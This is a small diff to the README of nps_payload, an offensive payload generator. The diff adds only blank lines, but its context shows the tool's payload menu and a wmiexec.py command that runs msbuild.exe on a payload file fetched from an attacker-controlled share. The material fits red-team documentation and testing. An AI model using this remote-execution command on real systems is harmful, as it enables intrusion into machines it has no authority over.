@@ -50,6 +50,7 @@ root@kali:~/Documents/nps_payload# python nps_payload.py
 
                        v1.03
 
+
         (1)     Generate msbuild/nps/msf payload
         (2)     Generate msbuild/nps/msf HTA payload
         (99)    Quit
@@ -78,3 +79,5 @@ Enter the listener port (443): 443
   b. Remote File Deployment:
     - wmiexec.py <USER>:'<PASS>'@<RHOST> cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attackerip>\<share>\msbuild_nps.xml
 ```
+
+
